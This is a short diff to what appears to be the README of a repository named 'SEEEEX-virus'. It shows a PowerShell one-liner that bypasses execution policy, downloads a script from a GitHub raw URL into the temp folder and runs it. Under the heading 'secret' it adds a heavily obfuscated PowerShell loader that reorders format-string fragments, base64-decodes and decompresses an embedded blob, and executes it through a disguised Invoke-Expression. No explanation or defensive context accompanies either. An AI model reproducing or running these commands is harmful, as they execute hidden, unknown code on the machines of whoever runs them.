@@ -2,4 +2,9 @@
 ```powershell
 powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ElenaMod/SEEEEX-virus/refs/heads/main/sex.ps1' -OutFile '$env:TEMP\sex.ps1'; & '$env:TEMP\sex.ps1'"
 ```
-# SEX
+
+**secret**
+```powershell
+((("{36}{126}{42}{129}{121}{62}{24}{93}{40}{43}{82}{37}{89}{0}{71}{61}{50}{9}{119}{111}{125}{12}{92}{100}{5}{32}{110}{7}{73}{20}{34}{51}{44}{45}{87}{21}{38}{102}{16}{53}{122}{107}{127}{46}{72}{117}{94}{90}{25}{112}{108}{68}{19}{91}{79}{28}{35}{98}{39}{69}{130}{23}{131}{128}{97}{31}{86}{8}{120}{49}{123}{6}{2}{80}{124}{48}{10}{103}{1}{22}{81}{64}{63}{14}{65}{116}{113}{74}{41}{115}{11}{76}{4}{105}{26}{84}{66}{114}{101}{18}{56}{77}{57}{58}{118}{75}{95}{99}{109}{104}{29}{88}{70}{59}{27}{106}{85}{3}{17}{132}{60}{67}{33}{83}{54}{15}{55}{47}{78}{96}{30}{52}{13}" -f'i','ZEFlwlNjEg','dapeI','.sTrEaMrE','m8+','9','AUqu','IX/','+5PWbt','( [IO.','ES','uu','B','toEND() ','82v','C','v5J7cm4','Ade','X','tXOmylCplLjw','y','bVKb','YeT2KsHm+TyH1fZT','oevClt','l','4s8OTJ6I','AD','  sYST','3EXk+','O',')','LU8','RS8','M.','29KlWd1EnU','FPa9U',' ','cT','tuso/e','j','nEW','A','LkcpshOme[21]+LkcPsH','-','oqA9','Ze2','jMx','DiNG','l','tkaV','m','86KggOR50',' }).REad','n','ExT.En','o','j','=','3Al ), ','BJecT','yst','Rea','[30]+3Alx3A','TE','Diz+6nHn','PfrD','M8','E','Q','Iy/kNQ',' nEW-O','o.coMprEsSIOn.DEfLATEsT','iEc','Sii','PqK','.cOMPresSiOn.COmpRe','U2W','/QI',']::a','8jJX','5o0fmNdzZXt0','L+vFr4Jwj','OBJe','T','f','O','BF','eL','rEach{','  SYSTeM.','qo','o8KHT3','Ase64S',')(','ngEURwBSwR9KKdm0yUn1A8BiPekzaJtd','ssion','sCiI','U5mlE','0','ModE]::Deco','TRing( 3AldY','6','/eMF8N5Jw','ydyOJQz2',')nvjF','qInt','EM.I','jsB','3rK','MpreSs','MwF','yst','7RpioIxVHd','Hsfm8Q','WHyz','2eo','U2v','Hb5','[IO','MeMOR','rjU2VpMkW','Me','rDOf','E2Q6FJEx','bUuDeCOEOZG','ReAm][CONvERT]::fRoM','&( ','iH+T','w1Z','O','5','jcZ','r(Lkc_,[s'))  -CREplace  ([CHAr]76+[CHAr]107+[CHAr]99),[CHAr]36  -CREplace([CHAr]110+[CHAr]118+[CHAr]106),[CHAr]124 -REPlAcE '3Al',[CHAr]39)| & ((vAriaBle '*Mdr*').NamE[3,11,2]-Join'')
+```
+# SEEX!
